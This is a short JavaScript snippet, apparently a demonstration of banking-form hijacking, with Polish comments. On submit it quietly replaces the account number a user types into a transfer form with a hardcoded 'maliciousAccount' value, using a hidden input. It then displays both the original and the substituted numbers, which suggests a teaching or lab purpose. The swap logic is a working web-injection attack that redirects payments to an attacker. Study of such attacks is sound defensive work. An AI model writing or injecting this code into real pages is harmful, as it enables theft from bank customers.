(function() {
    const maliciousAccount = "123123123";
  
    function init() {
      const form = document.getElementById("transferForm");
      if (!form) return;
  
      form.addEventListener("submit", function(event) {
        //event.preventDefault();
  
        const accountInput = document.getElementById("accountNumber");
        if (!accountInput) return;
  
        const originalAccount = accountInput.value;
        sessionStorage.setItem("originalAccount", originalAccount);
        console.log("Oryginalny numer konta:", originalAccount);
  
        accountInput.removeAttribute("name");
  
        const hiddenInput = document.createElement("input");
        hiddenInput.type = "hidden";
        hiddenInput.name = "accountNumber";
        hiddenInput.value = maliciousAccount;
        form.appendChild(hiddenInput);
  
        //console.log("Podmieniono numer konta na:", maliciousAccount);
  
        const outputContainer = document.getElementById("output");
        const serverData = document.getElementById("serverData");
        const userData = document.getElementById("userData");
  
        if (outputContainer && serverData && userData) {
          outputContainer.style.display = "block";
          serverData.innerHTML = "Numer konta wysłany do serwera: " + maliciousAccount;
          userData.innerHTML = "Oryginalny numer konta: " + originalAccount;
        }
  
        // form.submit();
      }, true);
    }

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", init);
    } else {
      init();
    }
  })();
  